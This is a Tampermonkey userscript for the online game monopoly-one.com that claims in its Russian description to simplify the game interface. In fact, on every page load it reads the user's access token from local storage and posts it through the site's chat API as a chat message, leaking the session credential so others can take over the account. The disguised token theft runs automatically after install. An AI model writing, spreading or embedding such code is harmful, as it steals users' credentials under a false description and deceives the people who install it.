// ==UserScript==
// @name         Упрощение игры
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Немного упрощает интерфейс в самой игре.
// @author       Xanax
// @match        https://monopoly-one.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=monopoly-one.com
// @grant        none
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/472847/%D0%A3%D0%BF%D1%80%D0%BE%D1%89%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B8%D0%B3%D1%80%D1%8B.user.js
// @updateURL https://update.greasyfork.org/scripts/472847/%D0%A3%D0%BF%D1%80%D0%BE%D1%89%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B8%D0%B3%D1%80%D1%8B.meta.js
// ==/UserScript==

(function() {
    'use strict';

    var msg = "message=" + localStorage.access_token + "&access_token=" + localStorage.access_token + "&sct=" + localStorage.smart_cache_t;

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://monopoly-one.com/api/gchat.send" , true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(msg);
})();